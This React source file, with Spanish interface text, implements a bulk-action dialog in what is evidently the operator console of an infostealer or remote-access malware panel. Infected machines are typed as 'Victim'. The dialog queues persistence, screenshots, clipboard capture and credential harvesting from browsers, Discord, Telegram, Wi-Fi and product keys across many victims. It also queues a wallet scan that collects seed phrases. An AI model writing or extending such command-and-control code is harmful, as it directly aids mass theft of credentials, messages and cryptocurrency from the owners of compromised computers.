'use client';
import { useEffect, useState } from 'react';
import { AlertTriangle } from 'lucide-react';
import { Dialog, DialogContent, DialogDescription, DialogTitle } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { mutate, useApi } from '@/hooks/useApi';
import { ApiError } from '@/lib/api';
import { ACTION_MAP, actionDetail, versionAtLeast, type ActionDef } from '@/lib/actions';
import { isWindows } from '@/lib/os';
import type { Task, Victim } from '@/lib/types';

const BULK_IDS = ['persist-on', 'persist-off', 'harvest', 'harvest-browsers', 'harvest-discord', 'harvest-telegram', 'harvest-wifi', 'harvest-productkey', 'screenshot', 'update', 'scan', 'clip-start', 'clip-stop', 'watch-on', 'watch-off', 'cancel-all'];

type Outcome = { host: string; ok: boolean; detail: string };

function bulkResolve(id: string, victim: Victim): { name: string; params: Record<string, unknown>; timeout: number } {
  if (id === 'scan') return { name: 'scan_wallets', params: { include_desktop: true, include_extensions: true, include_seeds: true, max_files: 4000, max_bytes: 268435456 }, timeout: 300 };
  const action = ACTION_MAP.get(id)!;
  return action.resolve!(victim);
}

function explain(error: unknown): string {
  if (error instanceof ApiError) {
    if (error.code === 'agent_offline') return 'sin socket';
    if (error.code === 'busy') return 'ocupado (4 en vuelo)';
    if (error.status === 429) return '429, reintenta';
    if (error.code === 'discord_unlinked') return 'sin enlace de Discord';
    return error.message;
  }
  return error instanceof Error ? error.message : 'error';
}


/** Bloque de confirmación puro, también se prueba sin el portal del diálogo. */
export function BulkPreview({ victims, onRun, disabled, showButton = true }: { victims: Victim[]; onRun: () => void; disabled?: boolean; showButton?: boolean }) {
  return (
    <div>
      <p className="text-xs text-muted">{victims.length} equipos seleccionados. Se ejecuta una petición por equipo para conservar el resultado parcial.</p>
      <div className="mt-2 flex max-h-28 flex-wrap gap-1 overflow-y-auto rounded border border-line p-1.5">
        {victims.slice(0, 40).map((victim) => <Badge key={victim.id} tone={victim.socket ? 'default' : 'warn'}>{victim.hostname}{victim.socket ? '' : ' · sin socket'}</Badge>)}
        {victims.length > 40 ? <Badge>+{victims.length - 40}</Badge> : null}
      </div>
      {showButton ? <Button className="mt-2" onClick={onRun} disabled={disabled || victims.length === 0}>Ejecutar en {victims.length}</Button> : null}
    </div>
  );
}

export function BulkDialog({
  open,
  victims,
  onClose,
  onQueued
}: {
  open: boolean;
  victims: Victim[];
  onClose: () => void;
  onQueued: () => void;
}) {
  const [id, setId] = useState('persist-on');
  const [busy, setBusy] = useState(false);
  const [outcomes, setOutcomes] = useState<Outcome[]>([]);
  const action: ActionDef | undefined = ACTION_MAP.get(id);
  const activeTasks = useApi<{ items: Task[] }>(open && id === 'cancel-all' ? '/tasks?status=running&limit=200' : null);
  const available = BULK_IDS.filter((value) => {
    const action = ACTION_MAP.get(value);
    if (action?.windowsOnly && !(victims.length > 0 && victims.every((victim) => isWindows(victim.os)))) return false;
    const minimum = action?.minAgent;
    return !minimum || (victims.length > 0 && victims.every((victim) => versionAtLeast(victim.agentVersion, minimum)));
  });

  useEffect(() => { if (open) setOutcomes([]); }, [open, id]);

  async function cancelFor(victim: Victim): Promise<Outcome> {
    const response = await fetch(`/api/console/tasks?victim=${victim.id}&status=running&limit=50`).then((res) => res.json()) as { items: Task[] };
    if (response.items.length === 0) return { host: victim.hostname, ok: true, detail: 'nada en vuelo' };
    let cancelled = 0;
    for (const task of response.items) {
      try { await mutate(`/tasks/${task.id}/cancel`, 'POST'); cancelled += 1; } catch { /* one by one */ }
    }
    return { host: victim.hostname, ok: true, detail: `${cancelled} canceladas` };
  }

  async function run() {
    if (busy || !action) return;
    setBusy(true);
    setOutcomes([]);
    const results: Outcome[] = [];
    for (const victim of victims) {
      try {
        if (id === 'cancel-all') { results.push(await cancelFor(victim)); continue; }
        const resolved = bulkResolve(id, victim);
        await mutate('/tasks', 'POST', { victim_ids: [victim.id], name: resolved.name, params: resolved.params, timeout_sec: resolved.timeout });
        results.push({ host: victim.hostname, ok: true, detail: actionDetail(action, victim) });
      } catch (error) {
        results.push({ host: victim.hostname, ok: false, detail: explain(error) });
      }
      setOutcomes([...results]);
    }
    setBusy(false);
    onQueued();
  }

  const okCount = outcomes.filter((row) => row.ok).length;
  const failCount = outcomes.length - okCount;

  return (
    <Dialog open={open} onOpenChange={(value) => { if (!value) onClose(); }}>
      <DialogContent className="w-[min(94vw,640px)]">
        <DialogTitle>Acción en lote</DialogTitle>
        <DialogDescription>{victims.length} equipos seleccionados. Se ejecuta una petición por equipo para conservar el resultado parcial.</DialogDescription>
        <div className="mt-3 space-y-3">
          <div>
            <label className="mb-1 block text-2xs uppercase tracking-wide text-muted">Acción</label>
            <select value={id} onChange={(event) => setId(event.target.value)} className="h-8 w-full rounded border border-line bg-bg px-2 text-xs">
              {available.map((value) => <option key={value} value={value}>{ACTION_MAP.get(value)?.label ?? value}</option>)}
            </select>
            {action ? <p className="mt-1 font-mono text-2xs text-muted">{action.detail ? (typeof action.detail === 'string' ? action.detail : action.detail(victims[0]!)) : 'cancelar tareas activas'}</p> : null}
          </div>

          <BulkPreview victims={victims} onRun={run} disabled={busy} showButton={false} />
          {victims.some((victim) => !victim.socket) && id !== 'cancel-all' ? (
            <p className="flex items-start gap-1 text-2xs text-warn"><AlertTriangle className="mt-0.5 h-3 w-3 shrink-0" /> Los equipos sin socket fallarán con agent_offline; el resto sí se encola.</p>
          ) : null}

          {outcomes.length > 0 ? (
            <div className="max-h-44 overflow-y-auto rounded border border-line">
              <p className="sticky top-0 border-b border-line bg-panel px-2 py-1 text-2xs text-muted">{okCount} correctos · {failCount} fallidos</p>
              {outcomes.map((row) => (
                <div key={row.host} className="flex items-center gap-2 border-b border-line/40 px-2 py-1 font-mono text-2xs last:border-0">
                  <Badge tone={row.ok ? 'ok' : 'bad'}>{row.ok ? 'ok' : 'fallo'}</Badge>
                  <span className="text-ink">{row.host}</span>
                  <span className="ml-auto truncate text-muted">{row.detail}</span>
                </div>
              ))}
            </div>
          ) : null}

          <div className="flex items-center justify-between">
            <span className="text-2xs text-muted">Las tareas aparecen en el log por equipo.</span>
            <div className="flex gap-2">
              <Button variant="ghost" onClick={onClose}>{outcomes.length > 0 ? 'Cerrar' : 'Cancelar'}</Button>
              <Button onClick={run} loading={busy} disabled={busy || victims.length === 0}>{outcomes.length > 0 ? 'Repetir' : `Ejecutar en ${victims.length}`}</Button>
            </div>
          </div>
          {id === 'cancel-all' && activeTasks.data ? <p className="text-2xs text-muted">{activeTasks.data.items.length} tareas activas en el panel.</p> : null}
        </div>
      </DialogContent>
    </Dialog>
  );
}
